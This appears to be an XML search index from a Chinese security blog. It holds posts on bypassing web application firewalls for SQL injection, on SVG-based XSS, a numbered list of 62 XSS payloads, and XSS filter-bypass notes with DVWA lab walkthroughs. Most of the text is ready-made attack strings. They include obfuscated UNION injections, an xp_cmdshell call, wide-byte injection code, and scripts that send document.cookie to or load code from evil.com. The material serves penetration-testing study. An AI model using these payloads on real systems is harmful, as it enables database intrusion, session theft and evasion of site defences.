常用的几个符号的一些Unicode编码： 单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7 空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0 左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8 右括号：%u0029、%uff09、\c0%29、\c0%a9、%e0%80%a9 ?id=10%D6&apos;%20AND%201=2%23 SELECT &apos;Ä&apos;=&apos;A&apos;; #1 一：前者利用宽字节绕过，比如对单引号转义操作变成\’，那么就变成了%D6%5C’，%D6%5C构成了一个宽字节即Unicode字节，单引号可以正常使用 二：示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过 三：另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过 替换关键字这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过。 index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4 建议不要对此抱有太大希望…. 使用注释常见的注释符： // -- /**/ # --+ -- - ; --a （1）普通注释index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4&apos;union%a0select pass from users# /**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别; #、–+用于终结语句的查询 （2）内联注释相比普通注释，内联注释用的更多，它有一个特性/*! */只有MySQL能识别(/*! */表示注释里面的语句会被执行) 实例一： ?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3 实例二： ?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4… 两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点当然前提是包括/、*在内的这些字符能正常使用 等价函数与命令有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用 ####（1）函数或变量 hex()、bin() ==&gt; ascii() sleep() ==&gt;benchmark() concat_ws()==&gt;group_concat() mid()、substr() ==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir() 比如substr()被过滤了可以用mid()和left()、right()等函数。 substr((select &apos;password&apos;),1,1) = 0x70 strcmp(left(&apos;password&apos;,1), 0x69) = 1 strcmp(left(&apos;password&apos;,1), 0x70) = 0 strcmp(left(&apos;password&apos;,1), 0x71) = -1 ####（2）符号 and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有=不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那边是等于了。在看一下用得多的空格，可以使用如下符号表示其作用：%20、%09、%0a、%0b、%0c、%0d、/**/ ####（3）生僻函数 MySQL/PostgreSQL支持XML函数： Select UpdateXML(‘&lt;script x=_&gt;&lt;/script&gt; ’,’/script/@x/’,’src=//evil.com’); ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1)) SELECT xmlelement(name img,xmlattributes(1as src,&apos;a\l\x65rt(1)&apos;as \117n\x65rror)); //postgresql ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制。 特殊符号乌云drops上“waf的绕过技巧”一文使用的几个例子： 使用反引号`，例如select `version()`，可以用来绕过空格和正则，特殊情况下还可以将其做注释符用 神奇的-+.，select+id-1+1.from users; +是用于字符串连接的，-和.在此也用于连接，可以逃过空格和关键字过滤 @符号，select@^1.from users; `@用于变量定义如@var_name，一个@表示用户定义，@@`表示系统变量 select-count(id)test from users; //绕过空格限制 部分可能发挥大作用的字符(前文中没怎么说到的): ` ~ ! @ % () [] . - + | %00 关键字拆分： ‘se’+’lec’+’t’ %S%E%L%E%C%T 1 ?id=1;EXEC(‘ma’+&apos;ster..x’+&apos;p_cm’+&apos;dsh’+&apos;ell ”net user”’) !和()： &apos; or --+2=- -!!!&apos;2 id=1+(UnI)(oN)+(SeL)(EcT) 使用这些”特殊符号”实现绕过是一件很细微的事情，一方面各家数据库对有效符号的处理是不一样的，另一方面你得充分了解这些符号的特性和使用方法才能作为绕过手段 HTTP参数控制这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制 HPP(HTTP Parameter Polution)（重复参数污染）/?id=1;select+1,2,3+from+users+where+id=1— /?id=1;select+1&amp;id=2,3+from+users+where+id=1— /?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users HPP又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的Web服务器处理方式。 具体WAF如何处理，要看其设置的规则，不过就示例中最后一个来看有较大可能绕过 HPF(HTTP Parameter Fragment)（HTTP分割注入）这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行) /?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users-- select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users— 缓冲区溢出缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过。 ?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出。 一些整合绕过的例子：id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*!information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– - ?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e-- index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4… 单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少 过滤掉and和or情况下的盲注假如有这样一个注入点 index.php?uid=123 但是and和or被过滤掉了，我们可以构造一下语句 index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123 123的时候页面是正确的，我们现在在盲猜hash的第一位，如果第一位等于0x42也就是B，那么strcmp结果为0，0+123=123，所以页面应该是正确的。否则就说明不是B，就这样猜，不用and和or了。 加括号/?id=1+union+(select+1,2+from+users) 如果上面一条被WAF拦截了，可以试着加一些括号。 /?id=1+union+(select+1,2+from+xxx) /?id=(1)union(select(1),mid(hash,1,32)from(users)) /?id=1+union+(select&apos;1&apos;,concat(login,hash)from+users) /?id=(1)union(((((((select(1),hex(hash)from(users)))))))) /?id=(1)or(0x50=0x50) 修复方案：1、如果可能，采用基于IP的白名单； 2、对各种不能解析的内容，全部禁止访问； 3、解析的协议，要全面； 4、对各种不符合标准模式的访问，禁止； 5、WAF解析方式，与后台的WEB服务器、web应用、数据库的解析方式尽可能一致； 6、关键字的匹配，需要考虑诸多变形情况。]]></content>
      <categories>
        <category>SQL</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SVG XSS黑魔法]]></title>
    <url>%2F2018%2F12%2F02%2FSVG-XSS%E9%BB%91%E9%AD%94%E6%B3%95%2F</url>
    <content type="text"><![CDATA[先来看两个代码，一个可执行一个不可执行。 可执行： &lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 不可执行： &lt;script&gt;alert&amp;#40;1)&lt;/script&gt; 那么为啥加了&lt;svg&gt;的可以执行？ 这就得由html解析流程说起了。 html解析到&lt;svg&gt;的时候会变成标签开始状态(Tag open state)，然后到标签名状态(Tag name state)，等等，最终到数据状态(Data state)，并释放当前标签的token，当解析器处于数据状态(Data state)时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。 svg属于外部元素。 外部元素来源于MathML和SVG命名空间。 而MathML（数学标记语言）是一种基于XML的标准。 那么可以猜测&lt;svg&gt;遵循XML和SVG的定义。 在XML中，&amp;#40;会被解析成( 在XML中实体会自动转义,除了&lt;![CDATA[和]]&gt;包含的实体 &lt;xml&gt; &lt;name&gt;aaa&lt;/name&gt; &lt;value&gt;aaaaaaa&amp;#40;&lt;/value&gt; &lt;/xml&gt; 当然，SVG标准中也定义了script标签的存在。 所以，这个XSS之所以能够执行是因为遵循了svg及xml的标准]]></content>
      <categories>
        <category>XSS</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS测试用例]]></title>
    <url>%2F2018%2F12%2F01%2FXSS%E6%B5%8B%E8%AF%95%E7%94%A8%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[1.&lt;script&gt; alert(1);&lt;/script&gt; 2.&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt; 3.&lt;script src=&quot;http://www.evil.com/cookie.php&quot;&gt;&lt;/script&gt; 4.&lt;script&gt;location.href=&quot;http://www.evil.com/cookies.php?cookie=&quot;+escape(document.cookie)&quot;&lt;/script&gt; 5.&lt;scr&lt;script&gt;ipt&gt;alert(&#39;xss&#39;);&lt;/scr&lt;/script&gt;ipt&gt; 6.&lt;img src=liu.jpg onerror=alert(/xss/)/&gt; 7.&lt;style&gt;@im\port&#39;\ja\vasc\ript:alert(\&quot;xss\&quot;)&#39;;&lt;/style&gt; 8.&lt;?echo(&#39;&lt;src)&#39;; echo(&#39;ipt&gt;alert(\&quot;xss\&quot;)&#39;;&lt;/script&gt;&#39;);?&gt; 9.&lt;marquee&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;/marquee&gt; 10.&lt;IMG SRC=\&quot;jav&amp;#0x9;ascript:alert(&#39;xss&#39;);\&quot;&gt; 11.&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt; 12.&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; 13.&lt;script src=http://www.evil.com/files.js&gt;&lt;/script&gt; 14.&lt;/title&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; 15.&lt;/textarea&gt;&lt;script&gt;alert(/xss)&lt;/script&gt; 16.&lt;IMG LOWSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt; 17.&lt;IMG DYNSRC=\&quot;javascript:alert(&#39;XSS&#39;)\&quot;&gt; 18.&lt;font style=&#39;color:expression(alert(document.cookie))&#39;&gt; 19.&#39;);alert(&#39;XSS 20.&lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot;&gt; 21.[url=javascript:alert(&#39;XSS&#39;);]click me[/url] 22.&lt;body onunload=&quot;javascript:alert(&#39;XSS&#39;);&quot;&gt; 23.&lt;body onLoad=&quot;alert(&#39;XSS&#39;);&quot; 24.[color=red&#39; onmouseover=&quot;alert(&#39;XSS&#39;)&quot;]mouse over[/color] 25.&quot;/&gt;&lt;/a&gt;&lt;/&gt;&lt;img src=1.gif onerror=alert(1)&gt; 26.window.alert(&quot;XSS&quot;); 27.&lt;div style=&quot;x:expression((window==1)?&quot;:eval(&#39;r=1;alert(String.fromCharCode(83,83,83));&#39;))&quot;&gt; 28.&lt;iframe&lt;?php eval chr(11)?&gt;onload=alert(&#39;XSS&#39;)&gt;&lt;/iframe&gt; 29.&quot;&gt;&lt;script alert(String.fromCharCode(88,83,83))&lt;/script&gt;30.&#39;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;h1&gt;&lt;/marquee&gt; 31.&#39;&quot;&gt;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 32.&#39;&quot;&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt; 33.&lt;META HTTP-EQUIV=\&quot;refresh\&quot; CONTENT=\&quot;0;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt; 34.&lt;META HTTP-EQUIV=\&quot;refresh\&quot;CONTENT=\&quot;0;URL=http://;url=javascript:alert(&#39;XSS&#39;);\&quot;&gt; 35.&lt;script&gt;var var=1; alert(var)&lt;/script&gt; 36.&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&#39;XSS&#39;)&quot;)}&lt;/STYLE&gt; 37.&lt;?=&#39;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&#39;?&gt; 38.&lt;IMG SRC=&#39;vbscript:msgbox(\&quot;XSS\&quot;)&#39;&gt; 39.&quot;onfocus=alert(document.domain)&quot;&gt;&lt;&quot; 40.&lt;FRAMESET&gt;&lt;FRAME SRC=\&quot;javascript:alert(&#39;XSS&#39;);\&quot;&gt;&lt;/FRAMESET&gt; 41.&lt;STYLE&gt;li {list-style-image:url(\&quot;javascript:alert(&#39;XSS&#39;)\&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS 42.&lt;br size=\&quot;&amp;{alert(&#39;xss&#39;)}\&quot;&gt; 43.&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt; 44.&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt; 45.[color=red width=expression(alert(123))][color] 46.&lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt; 47.Execute(MsgBox(chr(88)&amp;&amp;chr(83)&amp;&amp;chr(83)))&lt; 48.&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(123)&lt;/script&gt; 49.&lt;body onLoad=&quot;while(true) alert(&#39;XSS&#39;);&quot;&gt; 50.&quot;&lt;marquee&gt;&lt;img src=k.png onerror=alert(/xss/) /&gt; 51.&lt;div style=&quot;background:url(&#39;javascript:&#39;) 52.&lt;img src=&#39;java\nscript:alert(\&quot;XSS\&quot;)&#39;&gt; 53.&gt;&#39;&quot;&gt;&lt;img src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt; 54.&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt; 55.&lt;q/oncut=open()&gt; 56.&lt;q/oncut=alert(1)&gt;//在限制长度的地方很有效 57.&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt; // Firefox有效 58.&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt; 59.&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt; 60.&lt;formaction=&#39;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&#39;&gt;&lt;button&gt;CLICK 61.&lt;iframe/src=&quot;data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt; 62.&lt;body/onhashchange=alert(1)&gt;&lt;a href=#&gt;clickit]]></content>
      <categories>
        <category>XSS</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS绕过及DVWA实例]]></title>
    <url>%2F2018%2F12%2F01%2FXSS%E7%BB%95%E8%BF%87%E5%8F%8ADVWA%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[最基本的用法：&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt; 黑名单绕过：大多数的场所是用的黑名单来做过滤器的。 尝试插入比较正常的HTML标签，例如：&lt;b&gt;，&lt;i&gt;，&lt;u&gt;来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。 尝试插入不闭合的标签，例如：&lt;b，&lt;i，&lt;u，&lt;marquee然后看一下返回响应，是否对开放的标签也有过滤。 大小写及重写的绕过:&lt;SCRIscriptPT&gt;AalLEerRtT(&#39;xss&#39;);&lt;/SCscriptRIPT&gt; 事件绕过：利用JS事件进行相关绕过：&lt;img src=# onerror=alert(&#39;xss&#39;);&gt; 相关JS事件： 编码绕过： 当浏览器接受到一份HTML代码后，会对标签之间（&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;除外)、标签的属性中（&lt;a href=&#39;xxxx&#39;&gt;）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，如：&#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，那在href=&#39;xx&#39;这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段 例如：&lt;img src=1 onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt; 上述代码解析后为：&lt;img src=1 onerror=alert(1)&gt; ,可以弹窗 在代码被HTML解释器解释后，如果遇到需要填入url的位置，则该位置交由url解释器解释，如果是js代码的(例如onclick=””)，就js解释器解释，但是注意：javascript:不能用url编码代替，因为javascript:为协议类型，若是使用url编码，会被当作普通字符串，后面的js代码也不会被当作js代码解释 &lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt; 被url解释器解释完后为&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;，url中出现了javascript:，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。 当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#39;xss&#39;)&lt;/script&gt; 解码后为&lt;script&gt;alert(1)&lt;/script&gt;,一样可以弹窗。但如果是：&lt;script&gt;document.write(&#39;\u0039\u0041\u0059\u0097\u0108;\u0101\u0114\u0016\u0040\u0039\u0049\u0049\u0049&#39;)&lt;/script&gt; 解码后为 &lt;script&gt;document.write(&#39; &#39;);alert(&#39;111&#39;)&lt;/script&gt;就不要指望他可以弹窗了。因为解码出来的&#39;);alert(&#39;111仍为被当作字符串而不会影响上下文。 利用String.fromCharCode进行编码绕过测试代码： &lt;?php function xss_check($str){ if(preg_match(&apos;/script|alert/i&apos;, $str)) return &apos;error&apos;; else return $str; } @$id = $_GET[&apos;id&apos;]; echo xss_check($id); ?&gt; 屏蔽了alert(也可能是其他的)，此时可以使用编码绕过： &lt;img src=1 onerror=\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:\u0061\u006c\u0065\u0072\u0074(/xss/);&gt; 将javascript和alert进行unicode编码实现绕过，成功弹窗。 利用String.fromCharCode进行编码绕过:&lt;img src=2 onerror=eval(String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41))&gt; 其中String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41)是alert(/xss/)编码后的内容，google插件hackbar就有此功能。 GBK宽字节绕过测试代码： &lt;!DOCTYPE html&gt; &lt;meta charset=&quot;gbk&quot;&gt; &lt;?php error_reporting(0); $conn = mysql_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;); mysql_select_db(&apos;test&apos;,$conn); #mysql_query(&quot;set names gbk&quot;); $id = addslashes($_GET[&apos;sql&apos;]); $sql = &quot;SELECT username,password FROM admin WHERE id=&apos;{$id}&apos;&quot;; echo $sql.&apos;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&apos;; if($res = mysql_query($sql)){ while($row = mysql_fetch_array($res)){ var_dump($row); } }else{ echo &quot;Error&quot;.mysql_error().&quot;&lt;/br&gt;&quot;; } ?&gt; 直接‘会被转义，不会被执行。 使用宽字符就可以被成功执行 解析过程 $_GET[‘id’]经过addslashes编码之后带入了‘’ 变成 &lt;pre&gt;2%df%5C%27 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)%23&lt;/pre&gt; 带入mysql处理时使用了gbk字符集 %df%5c 運成功的吃掉了%5c %27‘单引号成功闭合 GBK编码，编码范围是0x8140~0xFEFE（不包括xx7F），在遇到%df(ascii(223)) &gt;ascii(128)时自动拼接%5c，因此吃掉‘，而%27、%20小于ascii(128)的字符就保留了。 0字节绕过&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt; &lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt; &lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt; 在IE9及以下版本成功绕过。 IE6下绕过IE下还可利用javascript:alert(/xss/); 或css body { background:black; xss:expression(alert(/zhuling.wang/));/*IE6下测试*/ } 成功绕过 DVWA测试用例反射性XSS低等级任意XSS都可用 中等级&lt;script &gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;sCript&gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;scri&lt;script&gt;pt&gt;alert(&apos;123&apos;)&lt;/script&gt; &lt;img src=# onerror=alert(1)&gt; &lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt;等等 高等级过滤掉script标签更严格，不能使用script标签 &lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt; &lt;img src=# onerror=alert(1)&gt; 其他html标签构造的事件还是可以使用的。 不可能级别用到了htmlspecialchars()，这个函数是将预定义的字符转换为 HTML 实体。预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 “ ‘ （单引号）成为 ‘ &lt; （小于）成为 &lt; （大于）成为 &gt; 存储型XSS低等级没有过滤直接注入，但是name框有最大长度限制，所以选择在message注入。 &lt;img src=# onerror=alert(1)&gt;等等 中等级因为一上来就给Message添加了htmlspecialchars函数所以不能进行注入，但是name框长度的最大限制是在html设置的，所以可以在审查元素中直接对长度进行修改。或者可以用burp抓包发送。 高等级message还是封死了，还是把script过滤掉了，跟中等级类似，抓包发送等等。 不可能级别这里对name和message都做了htmlspecialchars（）处理。 DOM型XSS低等级直接在网页导航栏构造GET XSS即可完成注入 中等级源码显示会过滤掉script标签，但是直接用&lt;img src=# onerror=alert(1)&gt;没有直接执行，尝试闭合option没有成功,尝试闭合select标签成功执行。 ?#default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;也可以。 高等级对传入值进行switch判断 ?default=English #&lt;script&gt;alert(1)&lt;/script&gt; #该字符后的数据不会发送到服务器端，从而绕过服务端过滤。]]></content>
      <categories>
        <category>XSS</category>
      </categories>
  </entry>
</search>
